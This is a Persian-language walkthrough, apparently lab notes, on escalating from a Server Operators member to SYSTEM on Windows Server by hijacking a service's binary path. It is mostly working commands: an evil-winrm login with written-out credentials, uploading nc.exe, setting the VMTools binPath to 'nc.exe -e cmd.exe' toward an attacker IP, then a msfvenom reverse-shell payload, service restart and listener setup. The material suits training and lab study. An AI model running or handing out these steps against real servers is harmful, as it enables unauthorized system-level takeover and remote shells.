
سیستم‌عامل ویندوز سرور از دو نوع موجودیت امنیتی برای احراز هویت و مجوزدهی استفاده می‌کند: حساب‌های کاربر و حساب‌های کامپیوتر. این حساب‌ها برای نشان دادن موجودیت‌های فیزیکی مانند افراد یا رایانه‌ها ساخته می‌شوند و می‌توان از آن‌ها برای اختصاص مجوزها به منظور دسترسی به منابع یا انجام کارهای خاص استفاده کرد. علاوه بر این، گروه‌های امنیتی ساخته می‌شوند تا حساب‌های کاربری، حساب‌های کامپیوتر و سایر گروه‌ها را در بر گیرند و مدیریت مجوزها را آسان‌تر کنند. سیستم با برخی حساب‌ها و گروه‌های از پیش‌پیکربندی‌شده عرضه می‌شود که دارای حقوق و مجوزهای لازم برای انجام عملکردهای مشخصی هستند.



کار آزمایشگاه را اینجا به پایان می‌رسانیم و با یک کاربر کم‌امتیاز در سرور وارد شدیم که می‌بینیم کاربر **aarti** عضو گروه **Server Operators** است. در این مثال با استفاده از سرویس **WinRM** و ابزار **evil-winrm** به میزبان آلوده متصل شده‌ایم. برای بررسی گروه‌هایی که کاربر در آن‌ها عضو است، می‌توانیم از فرمان داخلی ویندوز استفاده کنیم:

```
net user <username>
```

این فرمان نشان می‌دهد کاربر فعلی به چه گروه‌هایی تعلق دارد. برای بازتولید (reproduce) این سناریو، لطفاً دستورات زیر را اجرا کنید:


```
evil-winrm -I 192.168.1.16 -u aarti -p Ignite@987
```

![[Pasted image 20250916073521.png]]

عضویت در گروه **Server Operators** بذات یک آسیب‌پذیری نیست، اما اعضای این گروه دارای امتیازات ویژه‌ای‌اند که می‌تواند به مهاجم اجازه دهد تغییراتی در سیستم انجام دهد و در نتیجه به امتیازات سطح سیستمی ارتقا یابد.

ما سرویس‌های در حال اجرا روی سرور را با اجرای دستور `services` در ترمینال فهرست کردیم و لیست سرویس‌ها را دیدیم. سپس نام سرویس `VMTools` و مسیر باینری آن سرویس را یادداشت کردیم تا در حرکت جانبی (lateral movement) بعدی از آن استفاده کنیم.

🛠️ **روش بهره‌برداری شماره ۱**

ابتدا فایل اجرایی `netcat.exe` را به سیستم قربانی منتقل کردیم و مسیر باینری سرویس را تغییر دادیم. دلیل تغییر مسیر باینری این است که بتوانیم یک اتصال معکوس (reverse shell) به عنوان کاربر سیستم از میزبان قربانی دریافت کنیم.

🔍 **چطور کار می‌کند؟**

وقتی یک سرویس را اجرا می‌کنیم، فایل اجرایی آن از مسیر باینری مشخص‌شده اجرا می‌شود. بنابراین اگر فایل اجرایی سرویس را با netcat یا یک فایل reverse shell جایگزین کنیم، اتصال معکوس به ما داده می‌شود و این اتصال با سطح دسترسی کاربر سیستم خواهد بود، چون سرویس‌ها معمولاً با دسترسی SYSTEM اجرا می‌شوند.

نکته مهم: باید آدرس IP مهاجم و شماره پورت شنونده (listening port) را همراه با دستور netcat مشخص کنیم.


```
upload /usr/share/windows-binaries/nc.exe
```

```
sc.exe config VMTools binPath="C:\Users\aarti\Documents\nc.exe -e cmd.exe 192.168.1.205 1234
```

سپس سرویس را متوقف کرده و دوباره آن را راه‌اندازی می‌کنیم. این بار، وقتی سرویس اجرا می‌شود، فایل اجرایی‌ای را اجرا خواهد کرد که قبلاً در مسیر باینری تنظیم کرده‌ایم.

📡 لطفاً قبل از راه‌اندازی مجدد سرویس، یک شنونده (listener) با استفاده از netcat روی سیستم کالی راه‌اندازی کنید تا بتوانید شِل سیستم را دریافت کنید.

💻 همچنین، دستورات توقف و شروع سرویس باید از میزبان قربانی اجرا شوند


![[Pasted image 20250916074237.png]]

```
nc -lvp 1234
sc.exe stop VMTools
sc.exe start VMTools
```

🛠️ **روش بهره‌برداری شماره ۲**

در این روش، به جای استفاده از `nc.exe`، از فایل reverse shell ساخته‌شده توسط Metasploit استفاده می‌کنیم. ابتدا با استفاده از ابزار `msfvenom` یک فایل reverse shell ایجاد کرده و آن را با نام `shell.exe` ذخیره می‌کنیم.

🔍 **توضیح دستورات ساخت payload با msfvenom:**

- ابتدا نوع payload را انتخاب می‌کنیم که بر اساس سیستم‌عامل میزبان هدف است:  
    `windows/x64/shell_reverse_tcp`
- سپس `lhost` و `lport` را مشخص می‌کنیم که به ترتیب آدرس IP مهاجم و شماره پورت شنونده هستند. در این مثال، پورت ۸۸۸۸ استفاده شده است.
- در نهایت، با استفاده از فلگ `-f` نوع فایل خروجی را مشخص می‌کنیم که در اینجا `exe` است و فایل با نام `shell.exe` ذخیره می‌شود.

📁 این فایل اجرایی را می‌توان روی سیستم قربانی اجرا کرد تا اتصال معکوس با دسترسی سیستم برقرار شود.


```
msfvenom -p windows/x64/shell/reverse_tcp lhost=192.168.1.205 lport=8888 -f exe > shell.exe
```


```
upload /root/shell.exe
```

```
1. sc.exe config VMTools binPath="C:\Users\aarti\Documents\shell.exe"
2. sc.exe stop VMTools
3. sc.exe start VMTools
```

1
```
nc -lvp 8888
```

2
```
msfconsole 
use multi/handler
set lhost 192.168.1.205
set lport 8888
run
```
